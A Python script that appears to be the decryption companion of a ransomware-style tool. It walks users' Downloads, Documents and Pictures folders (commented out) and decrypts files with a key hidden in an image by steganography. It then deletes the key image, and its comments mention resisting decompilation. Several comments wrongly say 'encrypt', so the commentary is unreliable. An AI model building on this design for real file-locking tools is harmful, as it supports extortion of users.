import os
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor
from extract import extract_message


def decrypt_file(filename: str, f_key: Fernet):
    """
    Deciphers a single file provided the path of the file and the Fernet key to decrypt it.
    :param filename: Represents the file to undergo encryption
    :param f_key: Represents an instance of the Fernet Class created with a key.
    :return: None
    """
    # Assigns the data inside the encrypted file to a variable
    with open(filename, "rb") as encrypted_file:
        ciphertext = encrypted_file.read()
    # Decrypts the encrypted data using the key and assigns the unencrypted data to a variable
    plaintext = f_key.decrypt(ciphertext)
    # Overwrites the encrypted file to be unencrypted once more
    with open(filename, "wb") as unencrypted_file:
        unencrypted_file.write(plaintext)


def process_directory(directory: str, f_key: Fernet):
    """
    This function processes each directory, decrypting all the files in each directory. In turn will decrypt
    the .exe files to prevent potential opening and viewing of the source code in the future
    :param directory: Represents the directory that will have its files decrypted.
    :param f_key: Represents an instance of the Fernet Class created with a key.
    :return: None
    """
    # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
    for root, _, files in os.walk(directory):
        # Iterates through each file in the directory
        for file in files:
            # Combines the path of the directory with the file name to create the filepath of file
            file_path = os.path.join(root, file)
            # Decrypts the file given the newly generated filepath
            decrypt_file(file_path, f_key)
            print(file)


def main():
    # TODO: Update as needed
    # Should decrypt itself last in order to prevent decompiling in the future
    directories_to_decrypt = [
        #os.path.expanduser("~/Downloads"),
        #os.path.expanduser("~/Documents"),
        #os.path.expanduser("~/Pictures"),
        #os.getcwd()
    ]

    # Extracts the key from a specified image
    # TODO: Update image name/path as need
    with open ("images.txt", "r") as file:
        lines = file.readlines()
        image_containing_key: str = lines[0].strip("\n")
    with open("passphrase.txt", "r") as file:
        lines = file.readlines()
        passphrase = lines[0].strip("\n")
    key: str = extract_message(image_containing_key, passphrase)
    # Converts that key to a Fernet object to gain access to Fernet methods
    fernet_key: Fernet = Fernet(key)

    # Initializes ThreadPoolExecutor to execute multiple threads to speed up process of decryption
    with ThreadPoolExecutor() as executor:
        # Submits each directory to be processed in a separate thread
        futures = [executor.submit(process_directory, directory, fernet_key) for directory in directories_to_decrypt]
        # Ensures each thread completes by calling `.result()` on each future
        for future in futures:
            future.result()

    # Encrypts and removes the key from directory
    decrypt_file(image_containing_key, fernet_key)
    os.remove(image_containing_key)

    print("Decryption successful!")


main()
